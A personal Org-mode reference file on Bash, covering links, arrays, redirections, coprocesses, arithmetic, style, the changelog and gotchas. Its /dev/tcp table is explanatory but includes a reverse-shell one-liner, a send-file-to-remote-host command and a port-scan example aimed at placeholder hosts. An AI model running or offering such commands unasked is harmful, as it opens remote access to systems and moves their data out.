- source https://github.com/wasix-org/bash/
- manual https://www.gnu.org/software/bash/manual/bash.html
- wiki https://en.wikipedia.org/wiki/Bash_(Unix_shell)
  - Author: Brian Fox
  - 1989

- PS1's
  - ";"
    - allows you to copy multiple commands (also on rc shell)
    - PS1='%(?.%(!.#.;).%F{6}%B;%b%f) '

- https://bash-hackers.gabe565.com/
  - archive of the 2023 defunct wiki.bash-hackers.org
  - https://web.archive.org/web/20221101110416/https://wiki.bash-hackers.org/

- https://github.com/onceupon/Bash-Oneliner
- https://github.com/dylanaraps/writing-a-tui-in-bash

- https://www.commandlinefu.com/
- https://command-not-found.com/
- https://www.mulle-kybernetik.com/modern-bash-scripting/
- https://github.com/xwmx/bash-boilerplate
- https://github.com/dylanaraps/pure-bash-bible
- https://github.com/mrzool/bash-sensible
- https://github.com/joseluisq/awesome-bash-commands
- https://lobste.rs/s/iofste/please_stop_writing_shell_scripts
- Why doesn't set -e (or set -o errexit, or trap ERR) do what I expected?
  http://mywiki.wooledge.org/BashFAQ/105

- https://wizardzines.com/comics/bash-debugging/
  https://news.ycombinator.com/item?id=39568728

- LLM
  https://hackaday.com/2023/12/29/using-local-ai-on-the-command-line-to-rename-images-and-more/
  https://justine.lol/oneliners/
  https://gist.github.com/jart/bd2f603aefe6ac8004e6b709223881c0

- tool/lib: foreign function call helpers (C) https://github.com/taviso/ctypes.sh
- tool: fuse bindings (C) https://github.com/zevweiss/booze

* Language

- "Destructuring" with *read* https://stackoverflow.com/questions/1952404/linux-bash-multiple-variable-assignment

- exec CMD
  - make cmd replace the current shell, no new process is created

- Process substitution
  - careful of not forgetting an "<" in "cmd < <(cmd2)"
  - "cmd | tee >(cmd2) >(cmd3)" - sends "cmd" output to both "cmd2" and "cmd3" stdin https://tecadmin.net/bash-process-substitution/
  - bash won't wait for cmd2 or cmd3 to finish to exit
    - detailed explaination https://unix.stackexchange.com/questions/403783/the-process-substitution-output-is-out-of-the-order
    - you can hack together a ~work group~ type of thing with ~mkfifo~ https://unix.stackexchange.com/questions/351780/wait-for-bash-process-substitution-subshells

- Brace Expansion
  - support integer zero padding
  - supports a step {FROM..TO..STEP}
  - you can use an "enumeration" on a "for loop" using "for i in {this,that,theother}"

- commands run in a pipeline run at the same time
  https://mtlynch.io/zig-extraneous-build/#my-mental-model-of-bash-pipelines-is-wrong

- << EOF here document
  <<- EOF here document, ignore leading tabs
  #+begin_src sh
    $ eqn -Tpdf - <<eof | groff -me -T pdf > eqn.pdf
    .EQ
    sum from i=0 to infinity x sub i = pi over 2
    .EN
    eof
  #+end_src

- https://zwischenzugs.com/2018/10/12/eleven-bash-tips-you-might-want-to-know/
  https://zwischenzugs.com/2020/05/09/some-relatively-obscure-bash-tips/

- CTRL+z = sends a SIGTSTP aka suspends program
- jobs/bg/fg/%N

** Variables
|--------------+-----------+------------------------------------|
|              | example   | description                        |
|--------------+-----------+------------------------------------|
| OSTYPE       | linux-gnu | defined at compile type            |
| BASH_ARGV0   | foo.sh    | same as $0                         |
| BASH_ARGC    |           |                                    |
| BASH_ARGV    |           | array, all params in current stack |
| BASH_REMATCH |           | array, of =~ string match          |
| COLUMNS      |           | bash4+ number of columns in window |
| LINEs        |           | bash4+ number of rows in window    |
|--------------+-----------+------------------------------------|
** Coproc

- commands
  - simple: sequence of words
  - compound: shell constructs

- manual https://www.gnu.org/software/bash/manual/html_node/Coprocesses.html
  - coproc [NAME] cmd [redirections]
    - like "cmd &", runs async in a subshell
    - communication happens over pipes
      - NAME defaults to COPROC if none given
      - stdout in NAME[0]
      - stdin  in NAME[1]
    - "wait"

- example: progress bar https://gist.github.com/drewchapin/f43ab1a10367b1bfa53c55fe612d4245
- 10 https://www.linuxjournal.com/content/bash-co-processes
- 11 https://www.zsh.org/mla/users/2011/msg00095.html
- 18 https://www.linuxjournal.com/content/investigating-some-unexpected-bash-coproc-behavior
- 19 https://copyconstruct.medium.com/bash-coprocess-2092a93ad912
- 21 https://mbuki-mvuki.org/posts/2021-05-30-memoize-commands-or-bash-functions-with-coprocs/
  - a memoization solutions that works
  - classic solutions won't because =command substitution= $() runs in a subshell

** Types

- reserved words
- shell builtin
- numbers (? are of 2^ARCH size
- Bash does NOT support natively floating point numbers

- associative arrays
  - is always global
  - cannot be passed to a function by value
  - [[https://github.com/wasix-org/bash/blob/master/assoc.c]["are standard shell hash tables"]]
  - ops
    |-------------------+----------------|
    |        <c>        |                |
    |  declare -A arr   | init           |
    | declare -rA arr=( | init+assign+ro |
    |   ["c"]="foo")    |                |
    | arr["c"]="foobar" | assign         |
    |    ${arr["c"]}    | access         |
    |    ${!arr[@]}     | keys           |
    |     ${arr[*]}     | values         |
    | unset ${arr["c"]} | delete element |
    |     unset arr     | delete         |
    |-------------------+----------------|

- array
  - index start at 0(zero)
    - must be non-negative
  - [[https://github.com/wasix-org/bash/blob/master/array.c]["are sparse doubly-linked lists. An element's index is stored with it."]]
    - meaning that random access is O(n)
  - array ops https://tldp.org/LDP/abs/html/arrays.html
    |----------------------+----------------------------|
    | declare -a arr       |                            |
    | arr=(zero one two)   | init                       |
    | arr=([0]="zero num") | init whitespace support    |
    | arr+=(foo bar)       | append multiple            |
    | arr+=("blip bah")    | append one with whitespace |
    | ${!arr[@]}           | returns indices            |
    | ${#arr[@]}           | array size                 |
    | ${arr[0]}            | access                     |
    | ${arr[@]:1:3}        | slicing                    |
    | ${arr[@]// /_}       | substitute on each element |
    | ${arr[@]/#/foo}      | preppend "foo" to each     |
    |----------------------+----------------------------|

- string ops
  |-------------+-----------------|
  | ${foo:1:10} | slice           |
  | ${#foo}     | length          |
  | ${foo,}     | lowercase       |
  | ${foo^^}    | uppercase       |
  | ${foo^}     | capitalize      |
  | ${foo/a/b}  | substitute once |
  | ${foo//a/b} | substitute all  |
  |-------------+-----------------|

** Redirections

https://tldp.org/LDP/abs/html/io-redirection.html

- append output also to file
  - exec &>> file.txt
  - exec > >(tee file.txt) 2>&1
  - exec 2> >(tee -a file.txt)

- <filename cmd1              - alternative to cat pipe
  <filename >outfile cmd1

- Redirection Operators
  - "|&" https://stackoverflow.com/questions/35917552/what-does-the-syntax-mean-in-shell-language
  - "<>" https://bash.cyberciti.biz/guide/Opening_the_file_descriptors_for_reading_and_writing
  |-------------+------------------------------------------------|
  | ¦&          | shorthand for "2>&1 ¦"                         |
  | [n]<>word   | opens fd n at word, for r/w                    |
  | [n]<&word   | duplicates fd                                  |
  | [n]>&word   | duplicates fd                                  |
  | [n]<&-      | closes fd n (or 0)                             |
  | [n]<&digit- | moves fd digit to n (or 0), closes digit after |
  | [n]>&digit- | moves fd digit to n (or 1)                     |
  |-------------+------------------------------------------------|

- feature: open client socket
  - https://medium.com/@stefanos.kalandaridis/bash-ing-your-network-f7069ab7c5f4
  - /dev/tcp/host/port
  - /dev/udp/host/port
  - Examples:
    |---------------+-----------------------------------------------------------------------------------|
    | port scanning | timeout 0.5 echo < /dev/tcp/127.0.0.1/777/ && echo "open" ¦¦ echo "closed"        |
    | read stream   | cat < /dev/tcp/time.nist.gov/13                                                   |
    | receive file  | cat < /dev/tcp/remote.ip/1234 > file.txt                                          |
    | send file     | cat file.txt > /dev/tcp/remote.ip/4321                                            |
    | reverse shell | bash -c 'bash -i >& /dev/tcp/remote.ip/7777 0>&1'                                 |
    |---------------+-----------------------------------------------------------------------------------|
    | http request  | exec 5<>/dev/tcp/www.google.com/80                                                |
    |               | >&5 echo -e "GET / HTTP/1.1\r\nHost: www.google.com\r\nConnection: close\r\n\r\n" |
    |               | <&5 cat                                                                           |
    |---------------+-----------------------------------------------------------------------------------|
    * could have used "here documents" for the GET, using cat and >&5

** Special Parameters

|----+---------------------------|
| $_ | argument of last command  |
| $? | exit code of last command |
| $$ | self PID                  |
| $! | recent bg PID             |
|----+---------------------------|
| $# | number of arguments       |
| $0 | name of the script        |
| $* |                           |
| $@ |                           |
|----+---------------------------|

** select

- Creates an interactive selection menu

#+begin_src bash
  select var in {a..z}; do
    echo $REPLY $var
  done
  # ?# 2
  # 2 b
#+end_src

** getopt(s)

https://en.wikipedia.org/wiki/Getopts
- 1986-
- based on C's getopt

#+begin_src bash
  while getopts ":hf:" arg; do
      case $arg in
          h)  echo "help"; exit 1 ;;
          f)  echo "argument given: $OPTARG" ;;
          :)  echo "Mandatory argument missing for given flag $OPTARG"; exit 1;;
          \?) echo "Unknown flag";  exit 1;;
      esac
  done
  shift $((OPTIND - 1)) # allow positional arguments
#+end_src

** Arithmetic Evaluation $(())

- Equivalent to "let expressions"
  let arg [arg ...]

- "Evaluation is done in fixed-width *integers* with no check for overflow,
   though division by 0 is trapped and flaged as an error."
  - aka NOT floats

- "A shell variable that is null or unset evaluates to 0"

*** Operators

|-----------------------------------+--------------------------------------------|
|                <c>                |                                            |
|             OPERATOR              |                                            |
|-----------------------------------+--------------------------------------------|
|             id++ id--             | variable post-increment and post-decrement |
|             ++id --id             | variable pre-increment and pre-decrement   |
|                + -                | unary minus and plus                       |
|                **                 | exponentiation                             |
|               * / %               | multiplication, division, remainder        |
|                + -                | addition, subtraction                      |
|-----------------------------------+--------------------------------------------|
|                 !                 | logical negation                           |
|             <= >= < >             | comparison                                 |
|               == !=               | equality and inequality                    |
|                &&                 | logical AND                                |
|                ¦¦                 | logical OR                                 |
|-----------------------------------+--------------------------------------------|
|          expr?expr:expr           | conditional operator                       |
| = *= /= %= += -= <<= >>= &= ^= ¦= | assignment                                 |
|           expr1 , expr2           | comma                                      |
|-----------------------------------+--------------------------------------------|
|                 ~                 | bitwise negation                           |
|               << >>               | bitwise left and right shifts              |
|                 &                 | bitwise AND                                |
|                 ^                 | bitwise exclusive OR                       |
|                 ¦                 | bitwise OR                                 |
|-----------------------------------+--------------------------------------------|


* Tutorial: Style https://google.github.io/styleguide/shellguide.html

- Don’t brace-delimit single character shell specials / positional parameters,
  unless strictly necessary or avoiding deep confusion.
- Indentation: Indent 2 spaces. No tabs.
- Comment at the header
  #+begin_src bash
    #!/bin/bash
    #
    # Perform hot backups of Oracle databases.
  #+end_src
- Redirect errors to STDERR
  #+begin_src bash
    err() {
      echo "[$(date +'%Y-%m-%dT%H:%M:%S%z')]: $*" >&2
    }
  #+end_src
- Do not put an extension on executables, only on libraries
- Guidelines
  - When is ok
    * mostly calling other utilities
    * relatively little data manipulation
  - When NOT use
    * Scripts more than 100 lines long
    * Using non-straightfoward control flow logic
    * if performance matters

* Changelog

table of changes https://mywiki.wooledge.org/BashFAQ/061
5.0 discussion https://news.ycombinator.com/item?id=18852523

- 3.0 (2004)
  - regex? =~
- 4.0 (2009)
  - coproc
  - associative array
  - &>> and |&
  - mapfile/readarray
- 4.4 (2016)
  - mapfile/readarray -d
  - ${var@operator} "parameter transformation"
    - U uppercase
    - u capitalize
    - Q single quote
- 5.0 (2019) https://lists.gnu.org/archive/html/bug-bash/2019-01/msg00063.html
  - EPOCHSECONDS / EPOCHREALTIME
  - BASH_ARGV0 (same as $0)
- 5.1 (2020)
  - SRANDOM (32 bit random)

* Executable
- https://blog.flowblok.id.au/2013-02/shell-startup-scripts.html
#+CAPTION: initialization order for sh/bash/zsh
#+ATTR_ORG: :width 800
[[https://blog.flowblok.id.au/static/images/shell-startup-actual.png]]
* Codebases

- tui: file browser https://github.com/dylanaraps/fff/
- dns server backend https://github.com/basecamp/xip-pdns/blob/master/bin/xip-pdns
- maze solver https://gist.github.com/xsot/99a8a4304660916455ba2c2c774e623a
- web server https://github.com/dzove855/Bash-web-server
- web framework https://github.com/emasaka/shails
- web framework
  - https://github.com/cgsdev0/bash-stack/
  - https://bashsta.cc/0-index
- minecraft server
  - https://sdomi.pl/weblog/15-witchcraft-minecraft-server-in-bash/
  - https://github.com/sdomi/witchcraft
  - https://news.ycombinator.com/item?id=30347501

* Snippets

- Read keypress
  #+begin_src sh
    read -rsn1 keypress
    # -s  silent mode (not echo)
    # -n1 read 1 char
    # -r  raw mode, do not escape on backslash
  #+end_src

- Example: concatenation
  $ cut -d: -f2 studentlist.txt | xargs printf "%s@example.com"

- Common lines between files
  $ grep -Fxf file1 file2
  $ grep --fixed-strings --line-regexp --file file1 file2

- Not common lines
  $ grep -vFxf file1 file2

#+NAME: scramble string
#+begin_src bash
echo -n "${1}" | fold -w1 | sort -R | xargs -ILETTER echo -n LETTER

echo -n "${1}" | while read -n1 -r letter; do
     echo $letter
done | sort -R | xargs -ILETTER echo -n LETTER
#+end_src

#+begin_src bash
  die() { echo $1 >&2; exit 1; } # some_command || die "oh no!"
#+end_src

#+begin_src bash
  for cmd in sgr0 bold; do
    tput $cmd
    for i in $(seq 0 7); do
      for j in $(seq 0 7); do
        tput setaf $i; tput setab $j; echo -n " $i,$j "
      done
      tput sgr0; echo; tput $cmd
    done
  done
#+end_src

* Gotchas

1) for i in *.baz
   - if no .baz in dir it will run on the literal "*.baz"
   - zsh: errors
   - fish: does nothing
2) some language constructs spawn *subshells* (eg: pipelining)
3) | pipe
   - all piped commands run/start at the same time
   - if one fails the rest will ran regardless if "pipefail" is set
4) set -e
   - aka errexit
   - does NOT have any effect inside functions (?
